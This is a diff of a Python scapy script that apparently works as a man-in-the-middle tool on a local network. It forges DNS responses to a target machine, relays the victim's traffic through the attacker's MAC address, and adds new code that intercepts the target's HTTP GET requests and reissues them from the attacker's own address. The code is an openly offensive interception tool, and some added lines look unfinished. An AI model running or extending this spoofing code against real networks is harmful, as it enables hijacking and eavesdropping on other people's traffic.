@@ -1,6 +1,7 @@
 ### IMPORTS ###
 
 from scapy.all import *
+from scapy.layers.http import HTTPRequest
 import netifaces as ni
 import time
 import re
@@ -264,12 +265,30 @@ def process_pkt(target, iface, dns_hosts, my_addresses, gateways, s2):
             if pkt.haslayer(DNS) and pkt[IP].src == target['ip'] and pkt[DNSQR].qname in dns_hosts:
                 spoof.printf("Found DNS query from " + pkt[IP].src + " for " + pkt[DNSQR].qname + " Spoofing response.", 5)
 
-                # build a spoofed response and return it to the target
+                # build a spoofed response and return dlit to the target
                 resp_packet = build_dns_response_packet(pkt, dns_hosts[pkt[DNSQR].qname])
                 s2.send(resp_packet)
-            
+
+            # elif pkt[IP].src == target['ip'] and pkt.haslayer(HTTPRequest):
+                # if pkt[HTTPRequest].Method == "GET" and pkt[HTTPRequest].Path == "/":
+                #     print("Initial get request for " + pkt[HTTPRequest].Host)
+
             # the received packet is not for a website we care about
             elif pkt[IP].src == target['ip']:
+                if pkt.haslayer(HTTPRequest) and pkt[HTTPRequest].Method == "GET" and pkt[HTTPRequest].Path == "/":
+                    print("Initial get request for " + pkt[HTTPRequest].Host)
+                    pkt[Ether].src = str(my_addresses['mac'])
+                    pkt[IP].src = str(my_addresses['ip'])
+                    del pkt[TCP].chksum 
+
+                    url = pkt[HTTPRequest].Host
+                    port = pkt[TCP].dport
+                    s=socket.socket()
+                    s.connect((url,port))
+                    ss = StreamSocket(s,Raw)
+                    ss.sr1(Raw('GET /\r\n'))
+                    # input()
+                    # print(pkt.show())
 
                 # unspoof the mac address to point to the gateway
                 for gw_ip, gw_mac in gateways.items():
@@ -288,6 +307,7 @@ def process_pkt(target, iface, dns_hosts, my_addresses, gateways, s2):
 
                 # send the packet through the socket 
                 # this function automatically recalculates the checksum and length fields of all needed layers
+                
                 s2.send(pkt)
 
     # call the inner function
